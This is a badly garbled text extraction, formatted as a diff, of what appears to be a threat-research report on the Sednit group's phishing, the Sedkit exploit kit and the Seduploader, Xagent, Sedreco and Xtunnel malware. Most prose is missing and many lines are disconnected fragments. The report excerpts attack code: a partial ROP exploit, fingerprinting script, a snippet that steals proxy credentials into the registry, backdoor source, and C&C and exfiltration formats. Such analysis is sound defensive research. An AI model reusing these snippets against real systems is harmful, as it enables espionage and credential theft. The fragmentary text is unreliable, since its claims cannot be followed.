@@ -1,0 +1,2810 @@
+The Sednit Group
+
+[1]  
+[2]  [3]  
+
+[4]  
+
+CVE-2015-3043 CVE-2015-2590
+Flash Java
+
+CVE-2015-1701 CVE-2015-4902 CVE-2015-7645
+Windows LPE Java click-to-play bypass Flash
+
+APR MAY JUN JUL AUG SEP OCT
+
+CVE-2015-2424
+Office RCE
+
+The First Part of the Trilogy
+
+ATTACK FIRST-STAGE SECOND-STAGE PIVOT 
+METHODS MALWARE MALWARE MALWARE
+
+Seduploader Seduploader Sedreco Sedreco
+dropper payload dropper payload Xtunnel
+
+Sedkit
+
+Usbstealer
+
+Email
+attachments
+
+Downdelph Xagent
+
+Fake webmail 
+login panels
+
+En Route En Route En Route 
+with Sednit with Sednit with Sednit
+
+Part 1 Part 3 Part 2
+
+In this first part reliable  
+intended
+
+Seduploader
+
+Usbstealer
+
+[5]  
+[6]
+
+Attribution
+
+[7]
+
+specific
+
+Publication Strategy
+
+when to publish? how to make our publication useful to those tasked with 
+defending against such attacks?
+
+[8] [9]  
+
+Keep it readable:  
+ 
+
+Help the defenders:
+[10]
+
+Reference previous work:
+
+Document also what we do not understand:
+
+WHO ARE THE TARGETS?
+
+[1]
+
+[2]
+
+[3]
+
+How Did We Find the Target List?
+Context
+
+[8] 
+[11].
+
+Example of phishing email sent to attempt to steal Gmail credentials.  
+The hyperlink actually points to a domain used for phishing
+
+Fake Gmail login panel. Target’s name and email address have been redacted
+
+The Operators’ Mistake
+[12]  
+
+[13]
+
+http://login.accoounts-google.com/
+
+url/?continue=cGFyZXBreWl2QGdtYWlsLmNvbQ==&df=UGFraXN0YW4rRW1iYXNzeStLeWl2&tel=1
+
+continue parepkyiv@gmail.com  
+df Pakistan+Embassy+Kyiv
+
+What Is in the List?
+
+Number of URLs that were shortened per day during the first two months
+
+Number of times targets were attacked
+
+What Kind of Targets?
+
+[15]
+
+[16] 
+ 
+[17].
+
+Conclusion
+
+ATTACK METHODS
+
+.
+
+Email Attachments
+
+Downdelph  
+
+ID Targeted Application Notes Reference
+CVE-2009-3129 [18]
+
+CVE-2010-3333 [19]
+
+CVE-2012-0158 [20]
+
+CVE-2013-2729 [21]
+
+CVE-2014-1761 [22]  [23]
+
+CVE-2015-1641 [24] [25]
+
+CVE-2015-2424 [26]  [27]
+
+CVE-2016-4117 [78] [77]
+
+.
+
+Targeted phishing email sent in May 2016
+
+Good afternoon!
+
+Attached you can find the document on Russia and the European Union 
+aggravation of relations.
+
+Yours faithfully,
+
+Vasyl Stasiuk.
+Ukrainian Academic Union,
+02140, Ukraine, Kiev, Prospect Bazhana Mykoly, 26, office 334
+
+[28]
+
+[24]  
+[25]  
+
+Office Test  
+.
+
+[29].
+
+[30]
+
+Sedkit: Exploit Kit for Targeted Attacks
+Sedkit.  
+
+[23]
+ 
+
+[31].
+
+Sedkit
+
+Redirection
+Visitors selected to legitimate 
+
+website
+Attracting Fingerprinting Delivering
+
+visitors exploits
+
+Visitors not selected
+
+Attracting Visitors
+Sedkit
+
+ 
+Sedkit.
+
+Example of Sedkit targeted phishing email from March 2016
+
+[32]  
+
+stratfor.com
+
+/weekly/ruthless-and-
+
+sober-syria 51586
+
+Sedkit
+
+Sedkit
+
+Examples of Sedkit lure news articles  
+(see IOC Section for other Sedkit domain names) 
+
+Sedkit domain name Legitimate domain name Legitimate news article title
+
+Fingerprinting
+Sedkit  
+
+string_of_json += "\"timezone\"" + ":" + getTimeZone() + ","; ➊
+
+for(var prop in navigator) { ➋
+string_of_json += ...[REDACTED]...
+}
+
+string_of_json += "\"screen\":{ "; ➌
+for(var prop in screen) {
+string_of_json += ...[REDACTED]...
+}
+
+string_of_json += "\"plugins\":[ "; ➍
+//string_of_json += DetectJavaForMSIE();
+if(navigator.userAgent.indexOf("MSIE") > -1 ||
+navigator.userAgent.indexOf("Trident\/7.0") > -1)
+{
+string_of_json += DetectJavaForMSIE();
+string_of_json += DetectFlashForMSIE();
+string_of_json += EnumeratePlugins();
+//string_of_json += DetectPdfForMSIE();
+//string_of_json += DetectFlashForMSIE();
+}
+
+else
+
+{
+string_of_json += EnumeratePlugins();
+}
+
+navigator [33]
+
+screen [34]
+
+Example of a Sedkit report
+
+HTTP POST  
+
+xmlHttp.open("POST", "/tlPDH/DoHK/oZx0/65902/9751/?adv=4792&w1=cwXqTKEaLT&p1=14846 
+44566&pls=ES3So&c=9780071&w1=676193341&");
+
+Sedkit
+
+ 
+ 
+
+Sedkit.
+
+Delivering Exploits
+Sedkit  
+
+Sedkit  
+Sedkit.
+
+ID Targeted Application Notes Reference
+CVE-2013-1347 [35] [23]
+
+CVE-2013-3897 [36] [23]
+
+CVE-2014-1510 [37] None
+
+CVE-2014-1511 [38]
+
+CVE-2014-1776 [39] [23]
+
+CVE-2014-6332 [40]
+
+N/A  [41]
+ 
+
+CVE-2015-2590 [42]  [44]
+
+CVE-2015-4902 Sedkit
+[43]
+
+CVE-2015-3043 [45]  [46]
+Sedkit
+
+CVE-2015-5119 [47] [48]
+
+CVE-2015-7645 [49]  [50]
+Sedkit
+
+.
+ 
+
+[51]
+
+[52].  
+ 
+
+ 
+ 
+
+Sedkit.
+ 
+
+function createROP()
+ On Error Resume Next
+
+ shell_string = Unescape("%u8b64%u002d...[REDACTED]")
+
+ [REDACTED]
+
+ ie_11_case(ole32_base)
+ addToROP(ie_11_case_addr)
+ addToROP(rop_case_addr)
+ addToROP(&h04040404)
+ addToROP(vp_address)
+ addToROP(&h04040404)
+ addToROP(shell_addr)
+ addToROP(shell_addr)
+ addToROP(&h1000)
+ addToROP(&h40)
+ addToROP(shell_addr+1000)
+
+ ab(3) = rop_string
+end function
+
+[53] Slide extracted from a BlackHat USA 2014 presentation
+
+Sedkit
+
+function GetBaseAddrByPoiAddr_ole32( PoiAddr )
+ BaseAddr = 0
+ BaseAddr = PoiAddr And &hFFFF0000
+ Do While readM(BaseAddr)<>&h00905a4d
+  BaseAddr = BaseAddr - &h10000
+ Loop
+
+ ole32_base = BaseAddr
+ return BaseAddr
+end function
+
+Conclusion and Open Questions
+ 
+Sedkit 
+
+SEDUPLOADER: TARGET CONFIRMATION
+
+Identikit
+Seduploader serves as reconnaissance malware. It is made  
+up of two distinct components: a dropper and the per-
+sistent payload installed by this dropper.
+
+Alternative Names
+JHUHUGIT, JKEYSKW
+
+Usage
+Seduploader
+
+Seduploader
+Sedreco or Xagent.
+
+Known period of activity
+ 
+
+Known deployment methods
+Sedkit
+
+Distinguishing characteristics
+The Seduploader
+
+[54]
+
+Seduploader  
+
+Seduploader
+
+jhuhugit.temp jhuhugit.tmp or jkeyskw.temp 
+
+The Seduploader
+
+Timeline
+Oldest known Seduploader OS X Seduploader deployed with targeted 
+Seduploader version deployed with phishing emails using an exploit for 
+sample Sedkit using an exploit the Microsoft Office vulnerability 
+
+against MacKeeper [56] CVE-2015-1641 [58]
+
+2015 2016
+MAR APR MAY JUN JUL MAY AUG
+
+Seduploader’s dropper integrates Seduploader deployed Most recently known 
+a 0-day exploit for local privilege with targeted phishing Seduploader sample
+escalation (LPE) vulnerability [55] emails using a 0-day 
+
+exploit for the Microsoft 
+Office vulnerability 
+CVE-2015-2424 [57]
+
+One week after the Hacking 
+Team leak, Seduploader’s 
+dropper integrates a Hacking 
+Team exploit for LPE vulnera-
+bility CVE-2015-2387 [48]
+
+Seduploader 
+payloads  
+
+droppers’
+Seduploader
+
+Analysis
+Seduploader usually 
+
+Seduploader  
+
+[56].
+
+Dropper Workflow
+Seduploader
+
+Anti-analysis Payload Privilege Payload 
+trick dropping escalation persistence
+
+Anti-Analysis Trick
+
+B 42  
+
+B 42 Seduploader
+
+B  
+
+Seduploader
+
+Seduploader
+
+jhuhugit.temp jhuhugit.tmp or jkeyskw.temp  
+Seduploader
+
+Payload Dropping
+Seduploader UpLoader  
+
+Seduploader  
+Method (ESET names) Purpose
+decrypt_in_place
+
+decrypt_in_new_ decrypt_in_place
+
+memory
+
+get_env_var
+
+decrypt_embedded_
+
+files
+
+decompress
+
+RtlDecompressBuffer [59]
+
+drop
+
+execute_file
+init
+
+[60]
+
+delete_file
+
+UpLoader  
+[61] in some Seduploader
+
+[62]  
+
+Uploader  
+
+D:\REDMINE\JOINER\HEADER_PAYLOAD\header_payload\Uploader\
+Release\Uploader.pdb
+
+REDMINE
+
+[79].
+
+Privilege Escalation
+Seduploader
+
+Seduploader  
+
+Vulnerability Affected Platforms Period of Activity Notes
+CVE-2015-1701 [63] [64]
+
+CVE-2015-2387 [65] [48]
+
+Payload Persistence
+Seduploader  
+
+[66]
+Seduploader
+
+rundll32.exe
+[67] [68].
+
+[69]
+
+MMDeviceEnumerator [70]
+[71].
+
+[72]
+{3543619C-D563-43f7-
+
+95EA-4DA7E1CC396A}
+[73]
+
+HKCU\Environment\
+UserInitMprLogonScript
+
+[74]
+Seduploader
+
+Seduploader  
+
+Payload Workflow
+Seduploader
+
+Configuration file 
+download
+
+Network link Reconnaissance Network link 
+establishment report establishment
+
+Initialization Main loop
+
+Logs Payload 
+reporting download
+
+Payload 
+execution
+
+Initialization
+Network Link Establishment
+
+Seduploader  
+
+Seduploader google.com  
+or google.ru.
+
+Seduploader
+
+Direct Inject into 
+connection Via proxy running browser
+
+Google 
+successfully 
+contacted
+
+1. Direct Connection
+Seduploader HTTP POST  
+
+OK Not Found  
+
+Seduploader 
+
+Seduploader
+
+Seduploader  
+
+Seduploader  
+ 
+
+127.0.0.1 169.254.155.178
+169.254.0.0/16
+
+[75]  
+ 
+
+2. Via Proxy
+ 
+
+Seduploader  
+
+Seduploader
+
+pref.js network.proxy.http  
+network.proxy.http_port fields
+
+HKCU\Control 
+Panel\Desktop\WeelScrInit  
+
+Sedkit.
+
+Sedkit  
+[37] WeelScrInit Proxy-
+
+Authorization
+
+[76].
+
+var channel = ioserv.newChannel("http:////[...REDACTED...]//cormac.mcr", 0, null);
+
+var my_chan_host = channel.getRequestHeader("Proxy-Authorization");
+
+try {
+ var wrk = Components.classes["@mozilla.org/windows-registry- 
+key;1"].createInstance(Components.interfaces.nsIWindowsRegKey);
+ wrk.create(wrk.ROOT_KEY_CURRENT_USER, "Control Panel\\\\Desktop", wrk.ACCESS_
+WRITE);
+ var id = wrk.writeStringValue("WeelScrInit", my_chan_host);
+wrk.close();
+} catch (e) {}
+
+Seduploader HTTP POST  
+
+3. Inject Into a Running Browser
+Seduploader
+
+Seduploader
+
+Hash Process Name Browser Name
+
+Seduploader  
+CreateRemoteThread
+
+Seduploader
+OpenFileMapping 
+
+Seduploader
+
+Reconnaissance Report
+Seduploader
+
+id=XXXXXX&w=… . The id
+w  
+
+HKLM\SYSTEM\
+CurrentControlSet\Services\Disk\Enum disk=
+
+build=
+
+inject
+
+id=rA;ù&w=@[System Process]
+System
+
+smss.exe
+csrss.exe
+[REDACTED]
+disk=SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S\[REDACTED]
+build=0xb58f978f
+
+HTTP POST  
+
+Main Loop
+
+HTTP POST
+id=XXXXXX&c=1
+
+[file]
+Execute
+Delete
+[settings]
+Rundll=<export name>
+PathToSave=<path>
+FileName=<file name>
+IP=<IP address>
+[/settings]
+[/file]
+
+HTTP POST id=XXXXXX&f=<file name>
+
+GetLastError 
+HTTP POST id=XXXXXX&l=<error code>
+
+Downdelph
+Seduploader Downdelph  
+
+Sedreco or Xagent  
+
+Conclusion and Open Questions
+Seduploader
+
+Seduploader
+
+Seduploader
+
+CLOSING REMARKS
+
+Seduploader.
+
+The Second Part of the Trilogy
+
+ATTACK FIRST-STAGE SECOND-STAGE PIVOT 
+METHODS MALWARE MALWARE MALWARE
+
+Seduploader Seduploader Sedreco Sedreco
+dropper payload dropper payload Xtunnel
+
+Sedkit
+
+Usbstealer
+
+Email
+attachments
+
+Downdelph Xagent
+
+Fake webmail 
+login panels
+
+En Route with En Route En Route 
+Sednit with Sednit with Sednit
+Part 1 Part 3 Part 2
+
+In this second part  
+
+Sedreco Xagent  
+Xtunnel.
+
+Sedreco Xagent
+Seduploader
+
+Downdelph
+
+Xtunnel
+
+Usbstealer
+
+[5]  
+[6]
+
+XAGENT: BACKDOOR SPECIALLY COMPILED FOR YOU
+
+Identikit
+Xagent is a modular backdoor with spying functionalities 
+such as keystroke logging and file exfiltration.
+
+Alternative Names
+SPLM, CHOPSTICK
+
+Usage
+Xagent  
+
+Known period of activity
+ 
+
+Known deployment methods
+Downdelph
+Sedkit
+
+Seduploader
+Seduploader
+
+Distinguishing characteristics
+Xagent
+
+AgentKernel
+
+Xagent  
+
+Xagent
+
+Xagent  
+
+Timeline
+Xagent
+
+Xagent  
+
+Xagent  
+
+2012 2014 2014
+November February September
+
+Introduction of Xagent Introduction of Xagent Xagent deployed 
+version 1 for Windows version 2 for both Linux with Sedkit exploit kit [11]
+
+and Windows
+
+2014
+December
+
+Introduction of Xagent 
+version 3 for Windows; 
+
+Modules now have 
+obfuscated Run-Time Type 
+
+Information (RTTI)  [ 1   2  ] .
+
+2016 2015 2015
+May December February
+
+Xagent found on Introduction of Xagent Xagent for iOS found 
+the servers of the version 3 for Linux by Trend Micro [13]
+Democratic National 
+Committee (DNC)
+
+Context
+Xagent
+
+Xagent  
+
+Partial directory listing of Xagent source files
+
+Xagent
+
+[81]
+
+if(handleGetPacket != 0)
+{
+ pthread_exit(&handleGetPacket);
+ //TerminateThread(handleGetPacket, 0);
+ //CloseHandle(handleGetPacket);
+}
+
+Xagent
+
+Xagent
+[80]  
+
+Xagent  
+
+[…] 
+we decided to leave those comments 
+
+untouched
+
+/* Translates to: …* /
+
+Initialization
+Xagent main.cpp
+
+startXagent()
+
+int startXagent(wstring path)
+{
+ [...]
+
+ AgentKernel krnl( (wchar_t *)path.c_str() ); ➊
+
+ IAgentChannel* http_channel = new HttpChannel(); ➋
+ //IAgentChannel* smtp_channel = new MailChannel();
+
+ IAgentModule* remote_shell = new RemoteShell(); ➌
+ IAgentModule* file_system = new FSModule();
+ //IAgentModule* key_log = new RemoteKeylogger();
+
+ krnl.registerChannel(http_channel); ➍
+ //krnl.registerChannel(smtp_channel);
+ krnl.registerModule(remote_shell);
+ krnl.registerModule(file_system);
+ //krnl.registerModule(key_log);
+
+ krnl.startWork(); ➎
+ [...]
+}
+
+AgentKernel Xagent 
+
+IAgentChannel
+
+IAgentModule  
+Xagent  
+
+AgentKernel::registerChannel() AgentKernel::registerModule() 
+
+AgentKernel::startWork()  
+
+Xagent
+Xagent  
+
+Xagent
+Xagent
+
+Modules
+Xagent startXagent()  
+
+Xagent  
+
+Name ID Purpose Name of equivalent module 
+on Windows
+
+AgentKernel 0x0002 Xagent AgentKernel
+
+RemoteKeylogger 0x1002 ModuleRemoteKeyLogger
+
+FSModule 0x1122 ModuleFileSystem
+
+RemoteShell 0x1302 ProcessRetranslatorModule
+
+AgentKernel 0x0002  
+
+0.
+
+Xagent 0x3303  
+
+Xagent 0x0001.
+
+Xagent  
+[61]
+
+Xagent  
+
+DirectoryObserverModule  
+.doc .docx .pgp .gpg .m2f .m2o
+
+ModuleNetFlash  
+Usbstealer [5]
+
+ModuleNetWatcher
+
+Kernel
+AgentKerne  
+
+Xagent
+
+Constructor
+AgentKernel
+
+AgentKernel::AgentKernel(wchar_t *path_Xagent)
+{
+ [...]
+
+ local_storage_ = new LocalStorage(path_Xagent); ➊
+ [...]
+
+ cryptor_ = new Cryptor(kernel_main_crypto_key, sizeof(kernel_main_crypto_
+key)); ➋
+ [...]
+
+ channel_controller_ = new ChannelController(this); ➌
+
+ reserved_ = new ReservedApi(); ➍
+ [...]
+
+ modules_.insert(modules_.begin(), this); ➎
+}
+
+LocalStorage  
+[82] 
+
+Cryptor  
+
+ChannelController  
+
+ReservedApi  
+ReservedApi::initAgentId() Xagent
+
+Coder  
+
+Coder
+
+KERNEL_PATH_MAIN_KEY  
+mask
+
+Coder::getDencodeAscii()
+
+Coder* coder = new Coder((u_char *)KERNEL_PATH_MAIN_KEY,
+         
+sizeof(KERNEL_PATH_MAIN_KEY), mask, sizeof(mask) );
+
+string name_bd = coder->getDencodeAscii();
+
+Xagent
+Coder  
+
+Coder Xagent.
+
+AgentKernel.h  
+
+Xagent
+
+/* <xmlblok config=”MESSAGE” type=”u_char”><![CDATA[ */ static /* 
+]]> */
+ /* <type><![CDATA[ */ wchar_t /* ]]> */ /* </type> */
+ /* <static><![CDATA[ */ MUTEX_OF_XAGENT [] = /* ]]></static> 
+*/
+
+ /* <config operation=”L’unicode’={byte}”><![CDATA[
+L”XSQWERSystemCriticalSection_for_1232321” /* ]]> */ ; /* </
+config> */
+ /* </xmlblok> */
+
+Core Logic
+run()
+
+startWork() run() 
+
+Modules
+
+AgentKernel::giveMessage() AgentKernel::run()
+
+AgentKernel::takeMessage()
+
+Reports to C&C server 
+RemoteShell::giveMessage() the list of installed modules
+
+RemoteShell::takeMessage()
+
+FSModule::giveMessage() Fetches messages from 
+modules for the C&C server
+
+FSModule::takeMessage()
+
+Fetches messages 
+RemoteKeylogger::giveMessage() from C&C server for modules
+
+RemoteKeylogger::takeMessage()
+
+AgentKernel::translateToModule() AgentKernel::translateToController()
+
+1. Decrypts message 1. Encrypts message
+2. Transfer to intended module 2. Stores it into LocalStorage
+
+_get_questions Local Storage
+(C++ vector) (File on harddrive)
+
+ChannelController::getDataToServer() ChannelController::sendDataToServer()
+
+If there is an inbound 
+packet in currently selected If currently selected 
+
+channel is not working, Fetches message from Sends it through currently 
+channel, writes it into switch to another channel LocalStorage selected channel
+
+_get_questions vector
+
+IAgentChannel::getRawPacket() IAgentChannel::sendRawPacket()
+
+Legend
+Data flow
+Unencrypted messages
+(ModuleMsg objects)
+
+Data flow
+Encrypted messages
+(CryptRawPacket objects)
+
+C&C Server Control flow
+connected to Internet C++ method
+
+Hello Message
+AgentKernel::run()  
+
+PING_REQUEST  
+ 
+
+ModuleMsg  
+
+class ModuleMsg
+
+{
+private:
+
+ // ID агента от/кому предназначено сообщение
+ /* Translates to: The agent ID from/to whom the message is intended */
+ int agentId;
+
+ // ID модуля от/кому предназначено сообщение
+ /*Translates to: The module ID from/to whom the message is intended */
+ u_short modId;
+
+ // ID команды, которую выполнил модуль или которую нужно выполнить
+ /* Translates to: ID of the command that was executed, or will be executed */
+ u_char cmdId;
+
+ // Указатель на память, где лежат данные команды
+ /* Translates to: Pointer to the memory where data are */
+ u_char* data;
+
+[...]
+
+}
+
+modId 0x0002 cmdId PING_REQUEST  
+data #.
+
+The ModuleMsg AgentKernel::translateToController()
+CryptRawPacket
+
+Header
+
+0 4 8 n-15 n-4 n
+
+Agent ID Checksum Serialized ModuleMsg DATA_TOKEN RC4 register
+
+Legend
+Unencrypted text data
+
+RC4-encrypted data
+
+[83]  
+
+DATA_TOKEN
+
+register
+
+Downdelph Seduploader.
+
+As shown in LocalStorage  
+
+ChannelController::sendDataToServer()  
+
+Communications Loop
+As shown in AgentKernel::run()
+
+ModuleMsg
+RemoteKeylogger 
+
+CryptRawPacket _get_
+
+questions ChannelController::getDataFromServer()
+ModuleMsg
+
+START RemoteKeylogger
+
+Accepted Commands
+
+Name Integer Purpose
+Value
+
+GET_AGENT_INFO 1
+PING_REQUEST 2
+CHANGE_PING_TIMEOUT
+
+CHANGE_STEP_TIME  
+
+SET_PARAMETERS LocalStorage 
+
+CHANGE_CHANNEL  
+
+Name Integer Purpose
+Value
+
+CHANNEL_SET_  
+PARAMETERS
+
+LOAD_NEW_MODULE IAgentModule
+
+UNLOAD_MODULE
+
+LOAD_NEW_CHANNEL IAgentChannel  
+
+UNLOAD_CHANNEL
+
+UNINSTALL_XAGENT Xagent
+
+Communication Channels
+The ChannelController
+
+IAgentChannel.
+
+Name ID Network Protocols Name of equivalent channel  
+on Windows
+
+HttpChannel 0x2102 WinHttp
+
+MailChannel 0x2302  AgentExternSMTPChannel  
+
+send 
+receive
+
+IAgentChannel getRawPacket()  
+sendRawPacket()  
+
+CryptRawPacket
+
+Xagent Channel-
+Controller
+
+own in 
+
+LOAD_NEW_CHANNEL
+
+HttpChannel
+The HttpChannel::getRawPacket() HTTP GET  
+
+HttpChannel::sendRawPacket()  
+HTTP POST  
+
+HttpChannel.h.
+GET POST
+
+Chosen among Series of randomly 
+7 possible values chosen characters Encoded 
+
+from base64 alphabet agent ID
+
+http://X.X.X.X/path/?parameter1=value1&parameter2=value2&...&mark-token&...
+
+Chosen among Set to “ai” in Linux 
+15 possible values source code
+
+except mark
+
+ai token
+
+0 5 9 16 20
+
+Junk Key URL_TOKEN xor key Agent ID
+
+Legend
+Randomly chosen Base64 
+characters from encoded data
+base 64 alphabet
+
+Key URL_TOKEN
+
+POST GET
+CryptRawPacket
+
+DATA_TOKEN
+
+MailChannel
+The MailChannel Xagent
+
+Xagent MailChannel  
+
+Proxy server source files
+
+Xagent infected computer
+ID = 9312312 (fictional)
+
+Legend
+Data flow
+
+Control flow MailChannel::sendRawPacket()
+
+MailChannel::getRawPacket()
+
+P2Scheme
+(”Level 2 Protocol”)
+
+Email received at Email received at
+exfil@example.com orders@example.com
+
+MailServer.py
+
+For all known agents
+Fetch new email
+
+Send “TO” folder content 
+as email attachment
+
+Validate email subject
+
+if valid
+
+Save attachment in “FROM” 
+folder of the sender agent
+
+Proxy Server
+
+Storage folders
+for agent 9312312
+
+FROM TO
+
+w3s.py
+
+Send “FROM” folder content Ask C&C server for data 
+to C&C server and stores it into “TO” folder
+
+For all known agents
+
+P3Scheme
+(”Level 3 Protocol”)
+
+C&C Server
+connected to Internet
+
+HttpChannel MailChan-
+nel  
+
+W3Server
+Xagent
+
+MailChannel
+
+On the Agent
+The MailChannel::sendRawPacket() CryptRawPacket
+
+Xagent  
+
+P2Scheme  
+
+The email subject
+
+0 5 12 16
+
+Key SUBJ_TOKEN Agent ID xor 
+xor key key
+
+Key SUBJ_TOKEN
+0x55 
+
+0xAA Xagent
+
+The email body attachment name
+
+The boundary value [84]
+
+piradi nomeri
+gamarjoba hello
+
+detaluri_X.dat X detaluri 
+detailed
+
+[9].
+
+CryptRawPacket  
+exfil@example.com 
+
+MailChannel::getRawPacket()
+
+orders@example.com in 
+piradi nomeri  
+
+CryptRawPacket
+
+On the Proxy Server
+The MailServer.py  
+
+exfil@example.com  
+in 
+
+SUBJ_TOKEN  
+
+piradi nomeri
+MailServer.py
+
+P3Scheme  
+
+Junk
+
+LocalStorage.py
+
+CryptRawPacket
+
+w3s.py  
+
+HTTP POST  
+
+BASE_URL = “http://” + XAS_IP + XAS_GATE
+
+def url_for_agent(agent_id):
+ url = BASE_URL + “?s=” + P3_Scheme.pack_service_data(struct.pack(“<I”, SERVER_
+UID)) +\
+  “&a=” + P3_Scheme.pack_data(struct.pack(“<I”, agent_id))
+ return url
+
+XAS_IP XAS_GATE  
+SERVER_UID P3_Scheme.pack_service_
+
+data()
+
+w3s.py HTTP GET  
+
+MailServer.py
+
+Conclusion and Open Questions
+Xagent
+
+Xagent  
+
+SEDRECO: THE FLEXIBLE BACKDOOR
+
+Identikit
+Sedreco serves as a spying backdoor, whose functionalities 
+can be extended with dynamically loaded plugins. It is made 
+up of two distinct components: a dropper and the persistent  
+payload installed by this dropper.
+
+Alternative Names
+AZZY
+
+Usage
+Sedreco  
+
+Known period of activity
+
+Known deployment methods
+Seduploader
+Downdelph
+
+Distinguishing characteristics
+The Sedreco  
+
+Path msd  
+
+The Sedreco MutYzAz  
+or AZZYMTX
+
+Sedreco
+
+__2315tmp.dat __4964tmp.dat
+
+Context
+Sedreco usually  
+
+Sedreco  
+msdeltemp.dll
+
+Sedreco  
+
+Dropper Workflow
+Sedreco
+
+Configuration Payload Payload Payload 
+dropping dropping persistence execution
+
+Report to 
+“INST MSD” “INST FL” “INST RUN” “ST DL”
+
+C&C server
+
+Sedreco
+
+[72].
+
+INST MSD=0
+INST FL=0
+INST RUN=0
+ST DL=0
+
+0
+
+GetLastError
+
+Payload Workflow
+Sedreco
+
+Configuration
+Sedreco  
+
+Extract of Sedreco configuration. The names of the fields are those created  
+by ESET’s analysts. Field sizes are in bytes.
+
+[10].
+
+Timer1:  
+
+Timer2:  
+
+Computer Name:  
+
+C&C1:
+C&C2:
+Operation Name:
+
+rhze
+
+rhdn rhst rhbp mtfs mctf mtqs
+Keylogger MaxBuffer
+
+Keylogger MaxTimeout:
+
+Keylogger Flag:
+C&C3:
+
+Sedreco  
+Sedreco
+
+Commands
+Sedreco
+
+Number Purpose Number Purpose
+0 14
+
+1 15
+
+2 16
+
+tmp.dat
+
+3 17
+
+4 18 Sedreco  
+on disk
+
+5 19
+
+6 20
+
+7 21 systeminfo
+
+8 22
+
+9 23
+
+10 24 Sedreco
+
+11 25
+
+12 36
+
+13
+
+RegisterNewCommand
+
+Command registration — CMD functions are the commands handlers
+
+Sedreco
+
+Communications with the C&C server
+Sedreco
+
+Compromised 
+computer
+
+Inbound file
+(_2315tmp.dat)
+
+Sedreco Sedreco 
+core threads network threads
+
+Outbound file
+C&C Server
+
+(_4964tmp.dat)
+connected to Internet
+
+Sedreco  
+Sedreco  
+
+Inbound Communications
+Sedreco  
+
+C&C1  
+
+in 
+POST  
+
+/update  
+Network contact message format. Computer name is a variably-sized field
+
+Type
+
+Sedreco
+__2315tmp.dat %TEMP%
+
+Inbound file format. Field sizes are in bytes.
+
+0x75DF9115  
+
+Sedreco
+
+Outbound Communications
+Sedreco
+
+__4964tmp.dat %TEMP%  
+
+Outbound file format. Field sizes are in bytes.
+
+0xB2745DAF  
+SYSTEMTIME 
+
+[85]
+
+[86].
+
+Sedreco [87]. 
+LZW!
+
+ ((Dword *)buff)[0] = 0x21575A4C;  
+/* 'LZW!' signature */
+ ((Dword *)buff)[1] = bSize;
+ ((Dword *)buff)[2] = GetCRC32(data, bSize);
+ lastByte += 12;
+
+ LZWENTRY lzwTable[0x1000];
+ int tableSize = 0, beginTable = 0x100;
+ for (int k = 0; k <= 0xFF; k++) {
+  lzwTable[k].next = lzwTable[k].substrIndex = 0;
+  lzwTable[k].substrSize = 1;
+ }
+
+ Dword currentPos = 0;
+ while (currentPos < bSize)
+ {
+   /* Поиск самой длинной подстроки */
+
+Sedreco
+
+in appended Type  
+1.
+
+Sedreco
+
+Plugins
+Sedreco  
+
+A Sedreco Init UnInit. 
+Sedreco
+
+LoadLibraryA Init
+struct PluginArguments {
+ void *RegisterNewCommand;   // 
+Developers’ name (see Figure 13)
+ void *FN_read_file;     
+// ESET’s name (also applies to next fields)
+ void *FN_write_in_outbound_file;
+ void *FN_unregister_command;
+ HKEY_TYPE handle_opened_registry_hive;
+ void *output_buffer;
+ void *FN_append_to_output_buffer;
+};
+
+Sedreco
+
+Sedreco
+Plugin Init export
+
+When Sedreco UnInit  
+
+Plugin UnInit export
+
+Xagent 
+ProcessRetranslatorModule
+
+#EXC_1 Cannot create ExtToProc Pipe!.
+
+Conclusion and Open Questions
+Sedreco
+
+Sedreco  
+
+Sedreco
+Xagent
+
+XTUNNEL: REACHING UNREACHABLE MACHINES
+
+Identikit
+Xtunnel is a network proxy tool that can relay any kind  
+of network traffic between a C&C server on the Internet  
+and an endpoint computer inside a local network.
+
+Alternative Names
+XAPS
+
+Usage
+An Xtunnel
+
+Known period of activity
+
+Known deployment methods
+None
+
+Distinguishing characteristics
+Xtunnel
+
+Xtunnel  
+
+Timeline
+Xtunnel  
+
+on Xtunnel  
+
+2013 2013 2014
+May August April
+
+Oldest known New feature New feature
+Xtunnel sample UDP tunneling TLS encryption
+
+2015
+February
+
+New feature
+Connection to C&C server 
+
+through an HTTP proxy
+
+2015 2015 2015
+June May April
+
+New feature Xtunnel found New feature 
+Connection on the servers of the Command line 
+to C&C server through German politic party parameters parser
+a persistent HTTP “Die Linke” [  2  2   ] , as part 
+connection of an attack against the 
+
+Bundestag (the German 
+parliament) [23]
+
+2015 2016 2016
+July May August
+
+Code obfuscation Xtunnel found on Most recently known 
+introduced the servers of the Xtunnel sample
+
+Democratic National 
+Committee (DNC) [7]
+
+Big Picture
+Xtunnel
+
+Xtunnel  
+
+Internet
+
+C&C Server
+
+ID 12345 ID 45678
+
+Pivot computer
+Target internal (Xtunnel infected)
+
+network
+
+Target Target 
+computer A computer B
+
+Xtunnel  
+
+Xtunnel  
+
+[62]
+
+H:\last version 23.04\UNvisible crypt version XAPS select - 
+копия\XAPS_OBJECTIVE\Release\XAPS_OBJECTIVE.pdb
+C:\Users\John\Documents\Новая папк\XAPS_OBJECTIVE\Release\XAPS_
+OBJECTIVE.pdb
+
+копия Новая папк
+
+Traffic Proxying
+Xtunnel  
+
+Xtunnel
+
+C&C Server Pivot computer Target Target 
+connected to Internet (Xtunnel infected) computer A computer B
+
+Sends cryptographic 
+key & proof of correct 
+
+Encryption encryption
+handshake
+
+Sends “OK”
+
+Sends fallback port 
+number
+
+Orders to open tunnel 
+1 on computer A TCP connects
+
+Tunnel 1 
+opening Reports tunnel 1 
+
+opened
+
+Sends “DATA” 
+for tunnel 1 Sends “DATA”
+
+Reports “ANSWER” 
+received from tunnel 1 Sends “ANSWER”
+
+Reports “DATA2” 
+received from tunnel 1 Sends “DATA2”
+
+Orders to open tunnel 2 
+on computer B TCP connects
+
+Tunnel 2 
+opening
+
+Reports tunnel 2 
+opened
+
+Encryption Handshake
+Xtunnel  
+
+Xtunnel  
+
+Xtunnel T
+Extract of T initialization code
+
+Xtunnel T  
+offset O in T  
+
+T
+O + 128
+
+OK
+
+T  
+
+T.
+
+Tunneling
+Xtunnel  
+
+Xtunnel
+
+Xtunnel
+TunnelID  
+
+TunnelID
+
+Message to open tunnel 0x100 on IP address 192.168.124.1 and port 4545
+
+Message to open tunnel 0x200 on domain name test.com and port 4646
+
+1 3
+Xtunnel
+
+TunnelID
+
+Xtunnel  
+TunnelID 
+
+Xtunnel TunnelID  
+any kind of TCP data can be sent through the tunnel.
+
